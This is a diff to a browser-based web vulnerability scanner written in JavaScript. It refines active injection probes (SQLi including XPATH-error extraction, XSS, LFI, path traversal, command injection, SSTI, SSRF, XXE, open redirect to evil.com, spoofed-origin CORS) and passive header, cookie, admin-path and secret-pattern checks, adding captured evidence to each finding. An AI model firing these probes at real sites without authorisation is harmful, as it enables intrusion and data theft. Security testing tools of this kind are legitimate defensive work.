-    for (const tpl of XSS_TPL) { if (abortFlag) break; const pay = tpl.replace('PAYLOAD', marker); try { const t = mk(p, pay); tlog(L, '!', 'XSS ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const body = r.text || ''; if (body.includes(marker) && body.includes(pay)) { tlog(L, 'X', 'XSS CONFIRMED', 'vuln'); addFinding('XSS (reflected)', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
-    for (const pay of LFI) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'LFI ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); if (LFI_SIGNS.some(s => (r.text || '').includes(s))) { tlog(L, 'X', 'LFI CONFIRMED', 'vuln'); addFinding('LFI', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
-    for (const pay of PATH_TRAV) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'PathTrav ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); if (LFI_SIGNS.some(s => (r.text || '').includes(s))) { tlog(L, 'X', 'PathTrav CONFIRMED', 'vuln'); addFinding('Path Traversal', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
-    for (const pay of CMDI) { if (abortFlag) break; try { const t = mk(p, orig + pay); tlog(L, '!', 'CMDi ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const body = r.text || ''; if (CMDI_SIGNS.find(s => matchSign(body, s))) { tlog(L, 'X', 'CMDi CONFIRMED', 'vuln'); addFinding('CMDi', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
-    for (const pair of SSTI) { if (abortFlag) break; try { const pay = pair[0], expect = pair[1]; const t = mk(p, pay); tlog(L, '!', 'SSTI ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const txt = r.text || ''; if (txt.includes(expect) && !txt.includes(pay)) { tlog(L, 'X', 'SSTI CONFIRMED', 'vuln'); addFinding('SSTI', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} }
-    if (SSRF_PARAMS.includes(p.toLowerCase())) { for (const pay of SSRF_PAY) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'SSRF ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); if (SSRF_SIGNS.some(s => (r.text || '').includes(s))) { tlog(L, 'X', 'SSRF CONFIRMED', 'vuln'); addFinding('SSRF', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} } }
-    if (REDIR_PARAMS.includes(p.toLowerCase())) { for (const pay of REDIR_PAY) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'REDIR ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000, redirect: 'manual' }); const loc = r.headers['location'] || ''; if (loc && /evil\.com/i.test(loc)) { tlog(L, 'X', 'OpenRedirect -> ' + trunc(loc, 60), 'vuln'); addFinding('Open Redirect', url + ' [param:' + p + ']', url, 'FORMAT_VALID'); count++; break; } } catch {} } }
+
+    // SQLi error-based
+    for (const pay of SQLI_ERR_PAY) { if (abortFlag) break; try { const t = mk(p, orig + pay); tlog(L, '!', 'SQLi-err ?' + p + '=' + trunc(pay, 30), 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const low = (r.text || '').toLowerCase(); let hit = '', matched = ''; for (const [db, sigs] of Object.entries(SQLI_ERR)) { const s = sigs.find(x => low.includes(x)); if (s) { hit = db; matched = s; break; } } if (hit) { const ev = grabAround(r.text, matched); tlog(L, 'X', 'SQLi(' + hit + ') CONFIRMED - ?' + p + ' :: ' + trunc(ev, 90), 'vuln'); addFinding('SQLi (' + hit + ')', ev, url + ' [param:' + p + ']', 'FORMAT_VALID'); count++; break; } } catch {} }
+
+    // SQLi boolean
+    for (const pair of SQLI_BOOL) { if (abortFlag) break; try { const a = pair[0], b = pair[1]; const ta = mk(p, orig + ' ' + a), tb = mk(p, orig + ' ' + b); const [ra, rb] = await Promise.all([httpFetch(ta.href, { ms: 12000 }), httpFetch(tb.href, { ms: 12000 })]); const la = (ra.text || '').length, lb = (rb.text || '').length, delta = Math.abs(la - lb) / Math.max(la, lb); if (la > 100 && lb > 100 && delta > 0.25) { const ev = 'len_true=' + la + ' len_false=' + lb + ' delta=' + (delta*100).toFixed(0) + '%'; tlog(L, 'X', 'SQLi(bool) - ' + ev, 'vuln'); addFinding('SQLi (boolean)', ev, url + ' [param:' + p + ']', 'FORMAT_VALID'); count++; break; } } catch {} }
+
+    // SQLi time-based
+    for (const test of SQLI_TIME) { if (abortFlag) break; try { const t = mk(p, test.pay); tlog(L, '!', 'SQLi-time(' + test.dbms + ') ?' + p, 'pay'); const t0 = performance.now(); await httpFetch(t.href, { ms: 12000 }); const dt = performance.now() - t0; if (dt > test.thresh) { const ev = 'elapsed=' + dt.toFixed(0) + 'ms payload=' + test.pay; tlog(L, 'X', 'SQLi(time/' + test.dbms + ') - ' + dt.toFixed(0) + 'ms', 'vuln'); addFinding('SQLi (time/' + test.dbms + ')', ev, url + ' [param:' + p + ']', 'FORMAT_VALID'); count++; break; } } catch {} }
+
+    // SQLi extract — requires the actual XPATH error shape
+    for (const pay of SQLI_EXTRACT) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'SQLi-extract ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const body = r.text || ''; const m1 = body.match(/XPATH syntax error:\s*'~([^'~]{2,120})~/i); const m2 = body.match(/(UPDATEXML|EXTRACTVALUE)[^<]{0,40}error[^<]{0,120}/i); if (m1 || m2) { const ev = (m1 && ('~' + m1[1] + '~')) || (m2 && m2[0]) || ''; tlog(L, 'X', 'SQLi(extract) CONFIRMED :: ' + trunc(ev, 90), 'vuln'); addFinding('SQLi (extract)', ev, url + ' [param:' + p + ']', 'FORMAT_VALID'); count++; break; } } catch {} }
+
+    // XSS
+    for (const tpl of XSS_TPL) { if (abortFlag) break; const pay = tpl.replace('PAYLOAD', marker); try { const t = mk(p, pay); tlog(L, '!', 'XSS ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const body = r.text || ''; if (body.includes(marker) && body.includes(pay)) { const ev = grabAround(body, pay, 50); tlog(L, 'X', 'XSS CONFIRMED :: ' + trunc(ev, 90), 'vuln'); addFinding('XSS (reflected)', ev, url + ' [param:' + p + ']', 'FORMAT_VALID'); count++; break; } } catch {} }
+
+    // LFI
+    for (const pay of LFI) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'LFI ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const hitSig = LFI_SIGNS.find(s => (r.text || '').includes(s)); if (hitSig) { const ev = grabAround(r.text, hitSig); tlog(L, 'X', 'LFI CONFIRMED :: ' + trunc(ev, 90), 'vuln'); addFinding('LFI', ev, url + ' [param:' + p + ']', 'FORMAT_VALID'); count++; break; } } catch {} }
+
+    // Path Traversal
+    for (const pay of PATH_TRAV) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'PathTrav ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const hitSig = LFI_SIGNS.find(s => (r.text || '').includes(s)); if (hitSig) { const ev = grabAround(r.text, hitSig); tlog(L, 'X', 'PathTrav CONFIRMED :: ' + trunc(ev, 90), 'vuln'); addFinding('Path Traversal', ev, url + ' [param:' + p + ']', 'FORMAT_VALID'); count++; break; } } catch {} }
+
+    // CMDi
+    for (const pay of CMDI) { if (abortFlag) break; try { const t = mk(p, orig + pay); tlog(L, '!', 'CMDi ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const body = r.text || ''; const hitRe = CMDI_SIGNS.find(s => matchSign(body, s)); if (hitRe) { const ev = hitRe instanceof RegExp ? ((body.match(hitRe) || [''])[0]) : grabAround(body, hitRe); tlog(L, 'X', 'CMDi CONFIRMED :: ' + trunc(ev, 90), 'vuln'); addFinding('CMDi', ev, url + ' [param:' + p + ']', 'FORMAT_VALID'); count++; break; } } catch {} }
+
+    // SSTI
+    for (const pair of SSTI) { if (abortFlag) break; try { const pay = pair[0], expect = pair[1]; const t = mk(p, pay); tlog(L, '!', 'SSTI ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const txt = r.text || ''; if (txt.includes(expect) && !txt.includes(pay)) { const ev = pay + ' => ' + grabAround(txt, expect, 40); tlog(L, 'X', 'SSTI CONFIRMED :: ' + trunc(ev, 90), 'vuln'); addFinding('SSTI', ev, url + ' [param:' + p + ']', 'FORMAT_VALID'); count++; break; } } catch {} }
+
+    // SSRF
+    if (SSRF_PARAMS.includes(p.toLowerCase())) { for (const pay of SSRF_PAY) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'SSRF ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000 }); const sig = SSRF_SIGNS.find(s => (r.text || '').includes(s)); if (sig) { const ev = grabAround(r.text, sig); tlog(L, 'X', 'SSRF CONFIRMED :: ' + trunc(ev, 90), 'vuln'); addFinding('SSRF', ev, url + ' [param:' + p + ']', 'FORMAT_VALID'); count++; break; } } catch {} } }
+
+    // Open Redirect
+    if (REDIR_PARAMS.includes(p.toLowerCase())) { for (const pay of REDIR_PAY) { if (abortFlag) break; try { const t = mk(p, pay); tlog(L, '!', 'REDIR ?' + p, 'pay'); const r = await httpFetch(t.href, { ms: 12000, redirect: 'manual' }); const loc = r.headers['location'] || ''; if (loc && /evil\.com/i.test(loc)) { tlog(L, 'X', 'OpenRedirect -> ' + trunc(loc, 80), 'vuln'); addFinding('Open Redirect', 'Location: ' + loc, url + ' [param:' + p + ']', 'FORMAT_VALID'); count++; break; } } catch {} } }
   }
+
+  // XXE
   for (const pair of [[XXE_PAY_FILE, 'file-read'], [XXE_PAY_OOB, 'oob-ssrf']]) {
     if (abortFlag) break;
     const xxeBody = pair[0], xxeLabel = pair[1];
     for (const ct of ['application/xml', 'text/xml']) {
       if (abortFlag) break;
-      try { tlog(L, '!', 'XXE(' + xxeLabel + ') POST ' + ct, 'pay'); const r = await httpFetch(url, { method: 'POST', headers: { 'Content-Type': ct }, body: xxeBody, ms: 12000 }); const body = r.text || ''; if (LFI_SIGNS.find(s => body.includes(s)) || SSRF_SIGNS.find(s => body.includes(s))) { tlog(L, 'X', 'XXE CONFIRMED', 'vuln'); addFinding('XXE', url + ' [POST ' + ct + ']', url, 'FORMAT_VALID'); count++; break; } } catch {}
+      try { tlog(L, '!', 'XXE(' + xxeLabel + ') POST ' + ct, 'pay'); const r = await httpFetch(url, { method: 'POST', headers: { 'Content-Type': ct }, body: xxeBody, ms: 12000 }); const body = r.text || ''; const lfiHit = LFI_SIGNS.find(s => body.includes(s)); const ssrfHit = SSRF_SIGNS.find(s => body.includes(s)); const ev = (lfiHit && grabAround(body, lfiHit)) || (ssrfHit && grabAround(body, ssrfHit)); if (ev) { tlog(L, 'X', 'XXE CONFIRMED :: ' + trunc(ev, 90), 'vuln'); addFinding('XXE', ev, url + ' [POST ' + ct + ']', 'FORMAT_VALID'); count++; break; } } catch {}
     }
   }
-  if (!abortFlag) { const spoofed = 'https://evil-cors-test.example.com'; try { const rc = await httpFetch(url, { headers: { 'Origin': spoofed }, ms: 12000 }); const acao = (rc.headers && (rc.headers['access-control-allow-origin'] || '')) || ''; if (acao === '*' || acao.includes('evil-cors-test')) { tlog(L, 'X', 'CORS - ACAO=' + trunc(acao, 60), 'vuln'); addFinding('CORS', url + ' [ACAO:' + acao + ']', url, 'FORMAT_VALID'); count++; } } catch {} }
+
+  // CORS
+  if (!abortFlag) { const spoofed = 'https://evil-cors-test.example.com'; try { const rc = await httpFetch(url, { headers: { 'Origin': spoofed }, ms: 12000 }); const acao = (rc.headers && (rc.headers['access-control-allow-origin'] || '')) || ''; if (acao === '*' || acao.includes('evil-cors-test')) { const ev = 'Origin: ' + spoofed + ' -> ACAO: ' + acao; tlog(L, 'X', 'CORS - ' + ev, 'vuln'); addFinding('CORS', ev, url, 'FORMAT_VALID'); count++; } } catch {} }
   tlog(L, 'o', 'VULN-SCAN done - ' + count + ' hits', count ? 'vuln' : 'dim');
   return count;
 }
@@ -2127,7 +2245,7 @@ async function crawlSite(base, logId) {
       if (visited.has(norm)) continue;
       visited.add(norm);
       batch.push(u);
-      if (u.includes('?') && [...new URL(u).searchParams.keys()].length) vulnQueue.add(u);
+      if (u.includes('?') && !shouldSkipVuln(u) && [...new URL(u).searchParams.keys()].length) vulnQueue.add(u);
     }
     if (!batch.length) break;
     batchNo++;
@@ -2151,7 +2269,7 @@ async function crawlSite(base, logId) {
           try {
             if (new URL(l).hostname === domain) {
               const norm = l.split('#')[0].split('?')[0].replace(/\/$/, '');
-              if (!visited.has(norm)) { queue.push(l); newLinks++; if (l.includes('?')) vulnQueue.add(l); }
+              if (!visited.has(norm)) { queue.push(l); newLinks++; if (l.includes('?') && !shouldSkipVuln(l)) vulnQueue.add(l); }
             }
           } catch {}
         }
@@ -2200,7 +2318,7 @@ async function crawlSite(base, logId) {
               const safe = (new URL(u).hostname + new URL(u).pathname).replace(/[^a-z0-9._/-]/gi, '_');
               queueDownload(safe, res.text, u, L); savedFiles++;
             }
-            if (u.includes('?')) vulnQueue.add(u);
+            if (u.includes('?') && !shouldSkipVuln(u)) vulnQueue.add(u);
           }
         } catch (e) { }
         if (probedPaths - reported >= 50) { reported = probedPaths; tlog(L, '.', 'PROGRESS ' + probedPaths + '/' + targets.length + ' - hits=' + hitPaths + ' - findings=' + state.findings.length, 'dim'); }
@@ -2306,7 +2424,11 @@ function mlog(type, module, msg) {
 function mAddFinding(module, obj) {
   if (!modFindings[module]) modFindings[module] = [];
   modFindings[module].push(obj);
-  if (obj.url && obj.issue) addFinding(module.charAt(0).toUpperCase() + module.slice(1) + ': ' + obj.issue, obj.url, obj.url, 'FORMAT_VALID');
+  if (obj.url && obj.issue) {
+    // Prefer evidence if provided, otherwise fall back to the issue text — never the URL.
+    const value = obj.evidence || obj.issue;
+    addFinding(module.charAt(0).toUpperCase() + module.slice(1) + ': ' + obj.issue, value, obj.url, 'FORMAT_VALID');
+  }
 }
 function setModStatus(id, s) {
   const el = document.getElementById('modstatus-' + id);
@@ -2327,9 +2449,9 @@ async function runHeaders(target) {
       ['permissions-policy', 'Permissions-Policy missing']
     ];
     let missing = 0;
-    for (const c of checks) { const hdr = c[0], msg = c[1]; if (!h[hdr]) { mlog('vuln', 'headers', 'MISSING: ' + msg); mAddFinding('headers', { url: target, issue: msg }); missing++; } else mlog('ok', 'headers', 'PRESENT: ' + hdr); }
-    if (h['server']) { mlog('vuln', 'headers', 'Server header: ' + h['server']); mAddFinding('headers', { url: target, issue: 'Server disclosure: ' + h['server'] }); }
-    if (h['x-powered-by']) { mlog('vuln', 'headers', 'X-Powered-By: ' + h['x-powered-by']); mAddFinding('headers', { url: target, issue: 'Tech disclosure: ' + h['x-powered-by'] }); }
+    for (const c of checks) { const hdr = c[0], msg = c[1]; if (!h[hdr]) { mlog('vuln', 'headers', 'MISSING: ' + msg); mAddFinding('headers', { url: target, issue: msg, evidence: 'missing header: ' + hdr }); missing++; } else mlog('ok', 'headers', 'PRESENT: ' + hdr); }
+    if (h['server']) { mlog('vuln', 'headers', 'Server header: ' + h['server']); mAddFinding('headers', { url: target, issue: 'Server disclosure', evidence: 'Server: ' + h['server'] }); }
+    if (h['x-powered-by']) { mlog('vuln', 'headers', 'X-Powered-By: ' + h['x-powered-by']); mAddFinding('headers', { url: target, issue: 'Tech disclosure', evidence: 'X-Powered-By: ' + h['x-powered-by'] }); }
     if (missing === 0) mlog('ok', 'headers', 'All key headers present');
   } catch (e) { if (e.name === 'AbortError') throw e; mlog('warn', 'headers', 'Error: ' + e.message); }
   setModStatus('headers', 'done');
@@ -2338,15 +2460,15 @@ async function runHeaders(target) {
 async function runSSL(target) {
   setModStatus('ssl', 'running');
   mlog('info', 'ssl', 'Checking SSL/TLS');
-  if (!target.startsWith('https://')) { mlog('vuln', 'ssl', 'No HTTPS'); mAddFinding('ssl', { url: target, issue: 'No HTTPS' }); }
+  if (!target.startsWith('https://')) { mlog('vuln', 'ssl', 'No HTTPS'); mAddFinding('ssl', { url: target, issue: 'No HTTPS', evidence: 'plain http only' }); }
   else {
     mlog('ok', 'ssl', 'HTTPS in use');
     const http = target.replace('https://', 'http://');
-    try { const r = await httpMod(http); if (r.status >= 200 && r.status < 400 && !r.redirected) { mlog('vuln', 'ssl', 'HTTP accessible without redirect'); mAddFinding('ssl', { url: http, issue: 'HTTP accessible' }); } } catch {}
+    try { const r = await httpMod(http); if (r.status >= 200 && r.status < 400 && !r.redirected) { mlog('vuln', 'ssl', 'HTTP accessible without redirect'); mAddFinding('ssl', { url: http, issue: 'HTTP accessible', evidence: 'GET ' + http + ' -> ' + r.status }); } } catch {}
     try {
       const r = await httpMod(target); const hsts = r.headers['strict-transport-security'];
-      if (!hsts) { mlog('vuln', 'ssl', 'HSTS missing'); mAddFinding('ssl', { url: target, issue: 'Missing HSTS' }); }
-      else { const ma = (hsts.match(/max-age=(\d+)/i) || [])[1]; if (ma && parseInt(ma) < 2592000) { mlog('vuln', 'ssl', 'HSTS max-age too short: ' + ma); } else mlog('ok', 'ssl', 'HSTS: ' + hsts); }
+      if (!hsts) { mlog('vuln', 'ssl', 'HSTS missing'); mAddFinding('ssl', { url: target, issue: 'Missing HSTS', evidence: 'Strict-Transport-Security not set' }); }
+      else { const ma = (hsts.match(/max-age=(\d+)/i) || [])[1]; if (ma && parseInt(ma) < 2592000) { mlog('vuln', 'ssl', 'HSTS max-age too short: ' + ma); mAddFinding('ssl', { url: target, issue: 'HSTS max-age too short', evidence: 'max-age=' + ma }); } else mlog('ok', 'ssl', 'HSTS: ' + hsts); }
     } catch (e) { if (e.name === 'AbortError') throw e; }
   }
   setModStatus('ssl', 'done');
@@ -2362,8 +2484,8 @@ async function runCORS(target) {
       const r = await httpMod(target, { headers: { 'Origin': origin } });
       const acao = r.headers['access-control-allow-origin']; const acac = r.headers['access-control-allow-credentials'];
       if (acao) {
-        if (acao === '*') { mlog('vuln', 'cors', 'Wildcard CORS (*)'); mAddFinding('cors', { url: target, issue: 'Wildcard CORS', origin: origin }); }
-        else if (acao === origin) { if (acac === 'true') { mlog('vuln', 'cors', 'Reflects origin with credentials: ' + origin); mAddFinding('cors', { url: target, issue: 'Reflected CORS with credentials' }); } else mlog('info', 'cors', 'Reflects origin (no creds): ' + origin); }
+        if (acao === '*') { mlog('vuln', 'cors', 'Wildcard CORS (*)'); mAddFinding('cors', { url: target, issue: 'Wildcard CORS', evidence: 'Origin: ' + origin + ' -> ACAO: *' }); }
+        else if (acao === origin) { if (acac === 'true') { mlog('vuln', 'cors', 'Reflects origin with credentials: ' + origin); mAddFinding('cors', { url: target, issue: 'Reflected CORS with credentials', evidence: 'Origin: ' + origin + ' -> ACAO: ' + acao + ' ACAC: true' }); } else mlog('info', 'cors', 'Reflects origin (no creds): ' + origin); }
       }
     } catch (e) { if (e.name === 'AbortError') throw e; }
   }
@@ -2377,9 +2499,9 @@ async function runClickjacking(target) {
     const r = await httpMod(target);
     const xfo = r.headers['x-frame-options'], csp = r.headers['content-security-policy'];
     let ok = false;
-    if (xfo) { const v = xfo.toUpperCase(); if (v === 'DENY' || v === 'SAMEORIGIN') { mlog('ok', 'clickjacking', 'X-Frame-Options: ' + xfo); ok = true; } else { mlog('vuln', 'clickjacking', 'Weak XFO: ' + xfo); mAddFinding('clickjacking', { url: target, issue: 'Weak XFO' }); } }
+    if (xfo) { const v = xfo.toUpperCase(); if (v === 'DENY' || v === 'SAMEORIGIN') { mlog('ok', 'clickjacking', 'X-Frame-Options: ' + xfo); ok = true; } else { mlog('vuln', 'clickjacking', 'Weak XFO: ' + xfo); mAddFinding('clickjacking', { url: target, issue: 'Weak XFO', evidence: 'X-Frame-Options: ' + xfo }); } }
     if (csp && csp.includes('frame-ancestors')) { mlog('ok', 'clickjacking', 'CSP frame-ancestors'); ok = true; }
-    if (!ok) { mlog('vuln', 'clickjacking', 'No clickjacking protection'); mAddFinding('clickjacking', { url: target, issue: 'Missing clickjacking protection' }); }
+    if (!ok) { mlog('vuln', 'clickjacking', 'No clickjacking protection'); mAddFinding('clickjacking', { url: target, issue: 'Missing clickjacking protection', evidence: 'no XFO / no CSP frame-ancestors' }); }
   } catch (e) { if (e.name === 'AbortError') throw e; }
   setModStatus('clickjacking', 'done');
 }
@@ -2393,9 +2515,9 @@ async function runCookies(target) {
     if (!cookieLines.length) mlog('info', 'cookies', 'No Set-Cookie found');
     for (const c of cookieLines) {
       const low = c.toLowerCase(), name = c.split('=')[0];
-      if (!low.includes('httponly')) { mlog('vuln', 'cookies', '[' + name + '] missing HttpOnly'); mAddFinding('cookies', { url: target, cookie: name, issue: 'Missing HttpOnly' }); }
-      if (!low.includes('secure')) { mlog('vuln', 'cookies', '[' + name + '] missing Secure'); mAddFinding('cookies', { url: target, cookie: name, issue: 'Missing Secure' }); }
-      if (!low.includes('samesite')) { mlog('vuln', 'cookies', '[' + name + '] missing SameSite'); mAddFinding('cookies', { url: target, cookie: name, issue: 'Missing SameSite' }); }
+      if (!low.includes('httponly')) { mlog('vuln', 'cookies', '[' + name + '] missing HttpOnly'); mAddFinding('cookies', { url: target, cookie: name, issue: 'Missing HttpOnly', evidence: 'Set-Cookie: ' + trunc(c, 120) }); }
+      if (!low.includes('secure')) { mlog('vuln', 'cookies', '[' + name + '] missing Secure'); mAddFinding('cookies', { url: target, cookie: name, issue: 'Missing Secure', evidence: 'Set-Cookie: ' + trunc(c, 120) }); }
+      if (!low.includes('samesite')) { mlog('vuln', 'cookies', '[' + name + '] missing SameSite'); mAddFinding('cookies', { url: target, cookie: name, issue: 'Missing SameSite', evidence: 'Set-Cookie: ' + trunc(c, 120) }); }
     }
   } catch (e) { if (e.name === 'AbortError') throw e; }
   setModStatus('cookies', 'done');
@@ -2406,8 +2528,8 @@ async function runCacheCheck(target) {
   mlog('info', 'cachecheck', 'Cache headers');
   try {
     const r = await httpMod(target); const cc = r.headers['cache-control'];
-    if (!cc) { mlog('vuln', 'cachecheck', 'Cache-Control missing'); mAddFinding('cachecheck', { url: target, issue: 'Missing Cache-Control' }); }
-    else { mlog('info', 'cachecheck', 'Cache-Control: ' + cc); if (!cc.includes('no-store') && !cc.includes('no-cache') && !cc.includes('private')) { mlog('vuln', 'cachecheck', 'Allows caching'); mAddFinding('cachecheck', { url: target, issue: 'Cache-Control allows caching' }); } }
+    if (!cc) { mlog('vuln', 'cachecheck', 'Cache-Control missing'); mAddFinding('cachecheck', { url: target, issue: 'Missing Cache-Control', evidence: 'no Cache-Control header' }); }
+    else { mlog('info', 'cachecheck', 'Cache-Control: ' + cc); if (!cc.includes('no-store') && !cc.includes('no-cache') && !cc.includes('private')) { mlog('vuln', 'cachecheck', 'Allows caching'); mAddFinding('cachecheck', { url: target, issue: 'Cache-Control allows caching', evidence: 'Cache-Control: ' + cc }); } }
   } catch (e) { if (e.name === 'AbortError') throw e; }
   setModStatus('cachecheck', 'done');
 }
@@ -2424,7 +2546,7 @@ async function runInfoDisclose(target) {
       [/(?:AKIA|AROA|AIDA)[A-Z0-9]{16}/g, 'AWS key'],
       [/-----BEGIN\s+(?:RSA\s+|EC\s+|OPENSSH\s+)?PRIVATE KEY-----/g, 'PEM key']
     ];
-    for (const p of patterns) { const re = p[0], desc = p[1]; const m = txt.match(re); if (m && m.length > 0) { const preview = m[0].slice(0, 60); mlog('vuln', 'infodisclosure', desc + ': ' + preview); mAddFinding('infodisclosure', { url: target, issue: desc, preview: preview }); } }
+    for (const p of patterns) { const re = p[0], desc = p[1]; const m = txt.match(re); if (m && m.length > 0) { const preview = m[0].slice(0, 60); mlog('vuln', 'infodisclosure', desc + ': ' + preview); mAddFinding('infodisclosure', { url: target, issue: desc, evidence: preview }); } }
     if (r.headers['server']) mlog('vuln', 'infodisclosure', 'Server: ' + r.headers['server']);
     if (r.headers['x-powered-by']) mlog('vuln', 'infodisclosure', 'X-Powered-By: ' + r.headers['x-powered-by']);
   } catch (e) { if (e.name === 'AbortError') throw e; }
@@ -2441,9 +2563,9 @@ async function runHTTPMethods(target) {
       const timeout = getTimeout(), headers = { 'User-Agent': getUA() };
       const resp = await Promise.race([fetch(target, { method: method, headers: headers, mode: 'cors', credentials: 'omit', signal: modAbortController.signal }), new Promise((_, r) => setTimeout(() => r(new Error('timeout')), timeout))]);
       if (resp.status < 400 || resp.status === 200 || resp.status === 204) {
-        if (method === 'TRACE' || method === 'TRACK') { mlog('vuln', 'httpmethods', method + ' allowed'); mAddFinding('httpmethods', { url: target, issue: method + ' enabled' }); }
-        else if (method === 'OPTIONS') { const allow = resp.headers.get('allow') || ''; mlog('info', 'httpmethods', 'Allow: ' + allow); if (allow.includes('PUT') || allow.includes('DELETE')) { mlog('vuln', 'httpmethods', 'Dangerous: ' + allow); mAddFinding('httpmethods', { url: target, issue: 'Dangerous methods: ' + allow }); } }
-        else if (method === 'PUT' || method === 'DELETE') { mlog('vuln', 'httpmethods', method + ' responded ' + resp.status); mAddFinding('httpmethods', { url: target, issue: method + ' enabled' }); }
+        if (method === 'TRACE' || method === 'TRACK') { mlog('vuln', 'httpmethods', method + ' allowed'); mAddFinding('httpmethods', { url: target, issue: method + ' enabled', evidence: 'HTTP ' + method + ' -> ' + resp.status }); }
+        else if (method === 'OPTIONS') { const allow = resp.headers.get('allow') || ''; mlog('info', 'httpmethods', 'Allow: ' + allow); if (allow.includes('PUT') || allow.includes('DELETE')) { mlog('vuln', 'httpmethods', 'Dangerous: ' + allow); mAddFinding('httpmethods', { url: target, issue: 'Dangerous methods', evidence: 'Allow: ' + allow }); } }
+        else if (method === 'PUT' || method === 'DELETE') { mlog('vuln', 'httpmethods', method + ' responded ' + resp.status); mAddFinding('httpmethods', { url: target, issue: method + ' enabled', evidence: 'HTTP ' + method + ' -> ' + resp.status }); }
         else mlog('info', 'httpmethods', method + ' responded ' + resp.status);
       }
     } catch (e) { if (e.name === 'AbortError') throw e; }
@@ -2456,7 +2578,7 @@ async function runSubdomainTakeover(target) {
   mlog('info', 'subdomaintakeover', 'Takeover fingerprint');
   try {
     const r = await httpMod(target); const txt = r.text.toLowerCase();
-    for (const pair of TAKEOVER_INDICATORS) { const pattern = pair[0], svc = pair[1]; if (txt.includes(pattern.toLowerCase())) { mlog('vuln', 'subdomaintakeover', '(' + svc + '): ' + pattern); mAddFinding('subdomaintakeover', { url: target, issue: svc + ' takeover indicator' }); } }
+    for (const pair of TAKEOVER_INDICATORS) { const pattern = pair[0], svc = pair[1]; if (txt.includes(pattern.toLowerCase())) { const ev = grabAround(r.text, pattern); mlog('vuln', 'subdomaintakeover', '(' + svc + '): ' + pattern); mAddFinding('subdomaintakeover', { url: target, issue: svc + ' takeover indicator', evidence: ev }); } }
   } catch (e) { if (e.name === 'AbortError') throw e; }
   setModStatus('subdomaintakeover', 'done');
 }
@@ -2475,7 +2597,7 @@ async function runBruteForceCheck(target) {
       mlog('info', 'bruteforce', 'Login form: ' + url);
       let lockout = false;
       for (let i = 0; i < 5; i++) { modCheckAbort(); try { const rt = await httpMod(url); if (rt.status === 429 || rt.status === 403) { lockout = true; break; } if (rt.headers['x-ratelimit-limit']) { mlog('ok', 'bruteforce', 'Rate limit: ' + url); lockout = true; break; } } catch (e) { if (e.name === 'AbortError') throw e; } }
-      if (!lockout) { mlog('vuln', 'bruteforce', 'No rate limiting: ' + url); mAddFinding('bruteforce', { url: url, issue: 'No rate limiting' }); }
+      if (!lockout) { mlog('vuln', 'bruteforce', 'No rate limiting: ' + url); mAddFinding('bruteforce', { url: url, issue: 'No rate limiting', evidence: '5 sequential requests, no 429/403/ratelimit header' }); }
     } catch (e) { if (e.name === 'AbortError') throw e; }
   }
   setModStatus('bruteforce', 'done');
@@ -2489,8 +2611,8 @@ async function runAdminFinder(target) {
     const url = target + path; modCheckAbort();
     try {
       const r = await httpMod(url);
-      if (r.status === 200 || r.status === 301 || r.status === 302) { mlog('vuln', 'adminfinder', '[' + r.status + '] ' + url); mAddFinding('adminfinder', { url: url, status: r.status, issue: 'Admin panel found' }); }
-      else if (r.status === 401 || r.status === 403) { mlog('info', 'adminfinder', '[' + r.status + '] Protected: ' + url); mAddFinding('adminfinder', { url: url, status: r.status, issue: 'Protected admin endpoint' }); }
+      if (r.status === 200 || r.status === 301 || r.status === 302) { mlog('vuln', 'adminfinder', '[' + r.status + '] ' + url); mAddFinding('adminfinder', { url: url, status: r.status, issue: 'Admin panel found', evidence: 'HTTP ' + r.status + ' -> ' + url }); }
+      else if (r.status === 401 || r.status === 403) { mlog('info', 'adminfinder', '[' + r.status + '] Protected: ' + url); mAddFinding('adminfinder', { url: url, status: r.status, issue: 'Protected admin endpoint', evidence: 'HTTP ' + r.status }); }
     } catch (e) { if (e.name === 'AbortError') throw e; }
   }, getConc());
   setModStatus('adminfinder', 'done');
@@ -2504,9 +2626,9 @@ async function runAPIProbe(target) {
     const url = target + path; modCheckAbort();
     try {
       const r = await httpMod(url, { headers: { 'Accept': 'application/json' } });
-      if (r.status === 200) { const isJson = r.headers['content-type'] && r.headers['content-type'].includes('json'); if (isJson && r.text.length > 10) { mlog('vuln', 'apiprobe', 'API exposes data: ' + url); mAddFinding('apiprobe', { url: url, issue: 'Unauthenticated API response' }); } else mlog('info', 'apiprobe', '[200] ' + url); }
